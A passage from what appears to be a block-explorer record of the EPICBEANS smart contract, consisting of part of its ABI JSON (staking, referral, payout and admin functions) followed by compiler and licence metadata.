IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"bnbRewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"bnbTvl\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ref\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"buyBEANS\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_withdrawal\",\"type\":\"address\"}],\"name\":\"clearETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"dailyReward\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"eat\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"hasBeanTaxed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"hasInvested\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initializeContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"invested\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"maxPayout\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"maxPayoutReached\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"maxTvlReached\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"random_Token_Address\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"send_to_wallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"number_of_tokens\",\"type\":\"uint256\"}],\"name\":\"remove_Random_Tokens\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"_sent\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"secondsSinceLastEat\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newCeoAddress\",\"type\":\"address\"}],\"name\":\"setCeoAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newDevAddress\",\"type\":\"address\"}],\"name\":\"setDevAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newGiveawayAddress\",\"type\":\"address\"}],\"name\":\"setGiveawayAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newMarketingAddress\",\"type\":\"address\"}],\"name\":\"setMarketingAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBakers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"user\",\"outputs\":[{\"components\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"beans\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"bakedAt\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"ateAt\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"hasReferred\",\"type\":\"bool\"},{\"internalType\":\"address[]\",\"name\":\"referrals\",\"type\":\"address[]\"},{\"internalType\":\"address[]\",\"name\":\"bonusEligibleReferrals\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"firstDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalPayout\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"blacklisted\",\"type\":\"bool\"}],\"internalType\":\"struct EPICBEANS.Baker\",\"name\":\"\",\"type\":\"tuple\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"userBonusEligibleReferrals\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"userReferrals\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "EPICBEANS", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://437131ccf4d7e9768246dc2d200da7a1d59c90b84f9df0f0ab90a9f6f6ead569"}